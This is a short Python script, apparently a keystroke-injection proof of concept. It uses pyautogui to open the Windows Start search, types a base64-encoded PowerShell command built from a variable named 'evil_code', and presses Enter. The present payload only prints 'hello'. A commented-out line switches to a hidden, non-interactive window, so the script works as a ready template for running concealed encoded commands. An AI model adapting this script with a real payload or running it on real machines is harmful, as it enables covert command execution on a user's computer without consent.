import pyautogui
import base64
from time import sleep

powershell_command =""

def OpenSearchBar():
    pyautogui.keyDown('ctrl')
    pyautogui.press('esc')
    pyautogui.keyUp('ctrl')

def CodeFormation():
    global powershell_command

    evil_code = "Write-Host 'hello'; Pause"
    evil_code = base64.b64encode(evil_code.encode('UTF-16LE'))
    evil_code = str(evil_code,"UTF-8")

    powershell_command = "powershell -noexit -encodedCommand {}".format(evil_code)
    # powershell_command = "powershell -WindowStyle Hidden -NonInteractive -encodedCommand \"{}\"".format(evil_code)

def CodeInjection():
    pyautogui.write(powershell_command)
    sleep(1)
    pyautogui.press('enter')

def main():
    OpenSearchBar()
    CodeFormation()
    CodeInjection()

main()
